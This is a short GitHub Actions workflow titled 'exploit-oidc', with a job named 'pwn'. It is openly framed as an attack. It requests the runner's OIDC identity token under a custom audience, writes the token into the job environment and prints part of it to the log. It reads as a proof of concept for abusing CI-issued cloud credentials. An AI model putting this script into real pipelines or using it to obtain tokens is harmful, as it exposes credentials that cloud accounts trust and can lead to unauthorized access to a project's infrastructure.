name: exploit-oidc
on:
  workflow_dispatch:

jobs:
  pwn:
    runs-on: ubuntu-latest

    permissions:
      id-token: write   # REQUIRED for OIDC
      contents: read

    steps:
      - name: Get OIDC token
        id: oidc
        run: |
          echo "Requesting OIDC token..."

          TOKEN=$(curl -sSL \
            -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=foo" \
            | jq -r '.value')

          echo "OIDC_TOKEN=$TOKEN" >> $GITHUB_ENV
          echo "OIDC token retrieved (first 50 chars):"
          echo $TOKEN | head -c 50
